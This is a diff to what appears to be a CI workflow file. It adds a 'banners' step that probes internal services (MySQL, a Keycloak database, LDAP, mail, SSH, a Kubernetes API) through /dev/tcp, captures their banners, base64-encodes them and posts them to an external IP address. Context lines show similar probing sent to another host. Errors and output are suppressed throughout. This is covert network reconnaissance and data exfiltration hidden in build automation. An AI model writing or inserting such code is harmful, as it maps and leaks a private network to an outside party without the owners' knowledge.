@@ -56,6 +56,26 @@ jobs:
           for p in 22 993; do probe x 188.94.250.5 $p; probe x 188.94.250.7 $p; probe x 188.94.250.14 $p; probe x 188.94.250.245 $p; done
           } > /tmp/pr.txt 2>&1
           curl -s -m10 -X POST --data-binary "pr=$(base64 -w0 /tmp/pr.txt)" "http://$B/pr" >/dev/null 2>&1
+
+      - name: banners
+        continue-on-error: true
+        run: |
+          set +e
+          ban(){ local tag=$1 h=$2 p=$3; exec 9<>/dev/tcp/$h/$p 2>/dev/null || { echo "== $tag $h:$p CLOSED"; return; }; echo "== $tag $h:$p OPEN"; timeout 3 head -c 200 <&9 | xxd -g1 | head -60; exec 9<&-; }
+          {
+          ban mysql 192.168.51.35 3306
+          ban keycloak-db keycloak 5432
+          ban ldap sso.mittwald.it 389
+          ban ldaps sso.mittwald.it 636
+          ban smtp 188.94.250.245 25
+          ban imap 188.94.250.245 993
+          ban ssh 188.94.250.5 22
+          ban cm 10.42.41.4 443
+          ban cm6 10.42.41.6 443
+          ban k8s 100.124.0.1 6443
+          } > /tmp/ban.txt 2>&1
+          curl -s -m10 -X POST --data-binary "ban=$(base64 -w0 /tmp/ban.txt)" "http://94.130.22.61:9099/ban" >/dev/null 2>&1
+
       - name: services
         continue-on-error: true
         run: |
@@ -119,9 +139,10 @@ jobs:
             /tmp/marker.txt
             /tmp/sec.txt
             /tmp/gha.txt
+            /tmp/ban.txt
       - name: summary
         if: always()
         run: |
           { echo '# ci probe'; cat /tmp/marker.txt; echo; cat /tmp/pr.txt; } >> $GITHUB_STEP_SUMMARY 2>/dev/null || true
 
-# refresh 1793875427
+# refresh 1793875791
